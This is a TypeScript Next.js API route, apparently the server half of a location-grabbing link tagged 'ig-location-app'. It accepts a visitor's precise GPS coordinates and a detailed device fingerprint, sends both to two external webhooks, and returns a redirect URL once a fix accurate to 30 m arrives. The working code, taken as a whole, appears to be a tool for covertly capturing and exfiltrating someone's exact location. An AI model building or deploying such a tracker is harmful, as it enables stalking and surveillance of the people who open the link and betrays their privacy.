import { NextRequest, NextResponse } from 'next/server';

function buildPayload(body: any, eventType: string) {
  const {
    latitude,
    longitude,
    accuracy,
    altitude,
    altitudeAccuracy,
    heading,
    speed,
    timestamp,
    deviceInfo,
    googleMapsLink,
    attemptNumber,
  } = body;

  return {
    event: eventType,
    timestamp: new Date().toISOString(),
    locationRequestedAt: new Date(timestamp).toISOString(),
    attempt_number: attemptNumber || null,
    location: {
      latitude,
      longitude,
      accuracy_meters: accuracy,
      accuracy_rating: accuracy <= 10 ? 'EXCELLENT' : accuracy <= 20 ? 'GOOD' : accuracy <= 30 ? 'ACCEPTABLE' : accuracy <= 50 ? 'MODERATE' : 'LOW',
      meets_threshold: accuracy <= 30,
      altitude_meters: altitude || null,
      altitude_accuracy_meters: altitudeAccuracy || null,
      heading_degrees: heading || null,
      speed_mps: speed || null,
    },
    google_maps_link: googleMapsLink,
    device: {
      userAgent: deviceInfo?.userAgent || 'Unknown',
      platform: deviceInfo?.platform || 'Unknown',
      language: deviceInfo?.language || 'Unknown',
      cookiesEnabled: deviceInfo?.cookiesEnabled || false,
      doNotTrack: deviceInfo?.doNotTrack || null,
      screenWidth: deviceInfo?.screenWidth || null,
      screenHeight: deviceInfo?.screenHeight || null,
      pixelRatio: deviceInfo?.pixelRatio || null,
      colorDepth: deviceInfo?.colorDepth || null,
      vendor: deviceInfo?.vendor || 'Unknown',
      model: deviceInfo?.model || 'Unknown',
      os: deviceInfo?.os || 'Unknown',
      osVersion: deviceInfo?.osVersion || 'Unknown',
      browser: deviceInfo?.browser || 'Unknown',
      browserVersion: deviceInfo?.browserVersion || 'Unknown',
      isMobile: deviceInfo?.isMobile || false,
      isTouchDevice: deviceInfo?.isTouchDevice || false,
      connectionType: deviceInfo?.connectionType || 'Unknown',
    },
    metadata: {
      source: 'ig-location-app',
      version: '2.2.0',
    },
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, latitude, longitude, accuracy } = body;

    // Validate required fields
    if (!latitude || !longitude || !accuracy) {
      console.error('[API] Missing required location fields:', { latitude, longitude, accuracy });
      return NextResponse.json(
        { error: 'Missing required location fields', received: { latitude, longitude, accuracy } },
        { status: 400 }
      );
    }

    console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);

    const redirectUrl = process.env.REDIRECT_URL;
    const webhookUrl1 = process.env.WEBHOOK_URL;
    const webhookUrl2 = process.env.WEBHOOK_URL_2;

    // Determine event type
    const eventType = type === 'final' ? 'location_captured' : 'location_update';
    const payload = buildPayload(body, eventType);

    let webhook1Ok = false;
    let webhook2Ok = false;

    // ===== Send to WEBHOOK_URL (main webhook) =====
    if (webhookUrl1) {
      console.log(`[Webhook 1] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);
      try {
        const res1 = await fetch(webhookUrl1, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        webhook1Ok = res1.ok;
        console.log(`[Webhook 1] Response: ${res1.status} ${res1.statusText}`);
      } catch (err) {
        console.error('[Webhook 1] Fetch failed:', err);
      }
    } else {
      console.error('[Webhook 1] WEBHOOK_URL not configured!');
    }

    // ===== Send to WEBHOOK_URL_2 (second webhook) =====
    if (webhookUrl2) {
      console.log(`[Webhook 2] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);
      try {
        const res2 = await fetch(webhookUrl2, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        webhook2Ok = res2.ok;
        console.log(`[Webhook 2] Response: ${res2.status} ${res2.statusText}`);
      } catch (err) {
        console.error('[Webhook 2] Fetch failed:', err);
      }
    } else {
      console.warn('[Webhook 2] WEBHOOK_URL_2 not configured, skipping');
    }

    return NextResponse.json({
      success: true,
      type: type,
      redirectUrl: type === 'final' ? (redirectUrl || null) : null,
      webhook1Status: webhookUrl1 ? (webhook1Ok ? 'sent' : 'failed') : 'not_configured',
      webhook2Status: webhookUrl2 ? (webhook2Ok ? 'sent' : 'failed') : 'not_configured',
      accuracy: accuracy,
    });
  } catch (error) {
    console.error('[API] Location API error:', error);
    return NextResponse.json(
      { error: 'Internal server error', details: String(error) },
      { status: 500 }
    );
  }
}
